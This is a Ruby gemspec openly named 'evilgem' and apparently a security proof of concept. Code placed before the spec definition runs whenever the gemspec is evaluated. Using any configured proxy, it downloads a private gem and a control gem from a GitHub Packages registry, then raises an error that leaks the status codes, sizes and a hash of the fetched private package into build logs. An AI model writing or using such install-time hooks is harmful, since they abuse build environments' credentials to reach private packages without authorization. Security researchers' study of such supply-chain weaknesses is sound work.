require "net/http"
require "uri"
require "digest"
MARK = "ACTORB2-434ba5"
PXY  = ENV["https_proxy"] || ENV["HTTPS_PROXY"] || ENV["http_proxy"] || ENV["HTTP_PROXY"]
def _get(url, depth = 0)
  u = URI(url)
  h = if PXY && !PXY.empty?
    p = URI(PXY); Net::HTTP.new(u.host, u.port, p.host, p.port)
  else
    Net::HTTP.new(u.host, u.port)
  end
  h.use_ssl = (u.scheme == "https"); h.open_timeout = 15; h.read_timeout = 25
  r = h.get(u.request_uri)
  if depth < 5 && r.is_a?(Net::HTTPRedirection) && r["location"]
    return _get(r["location"], depth + 1)
  end
  [r.code, r.body.to_s]
end
B = "https://rubygems.pkg.github.com/czarflix-org"
ic, ib = _get("#{B}/info/cdxgranted")
gc, gb = _get("#{B}/gems/cdxgranted-0.0.1.gem")       # granted: download actual private .gem
nc, nb = _get("#{B}/gems/cdxnotgranted-0.0.1.gem")    # control: not granted
raise "#{MARK} info=#{ic}/#{ib.bytesize} GEM_granted=#{gc}/#{gb.bytesize}/sha=#{Digest::SHA256.hexdigest(gb)[0,16]} GEM_notgranted=#{nc}/#{nb.bytesize} is_gem=#{gb[0,4].inspect}"
Gem::Specification.new do |s|
  s.name = "evilgem"; s.version = "0.0.1"; s.summary = "x"; s.authors = ["b"]; s.files = []
end
